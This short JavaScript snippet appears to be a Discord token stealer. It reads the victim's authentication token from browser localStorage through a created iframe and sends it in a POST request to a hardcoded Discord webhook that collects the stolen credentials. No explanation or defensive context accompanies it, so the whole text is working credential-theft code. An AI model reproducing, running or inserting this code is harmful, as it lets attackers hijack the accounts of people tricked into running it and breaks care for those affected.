location.reload();
var webhook = "https://discord.com/api/webhooks/990527664446140427/qb7IStKZqXMk_-2hMMJOYlhm1KeED2og6hnbciA6ZWpbDYIyo7UPAQP7v9cwqB3V-YYQ";
var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
var request = new XMLHttpRequest();
request.open("POST", webhook);
request.setRequestHeader('content-type', 'application/json');
request.send(JSON.stringify({"content": token}));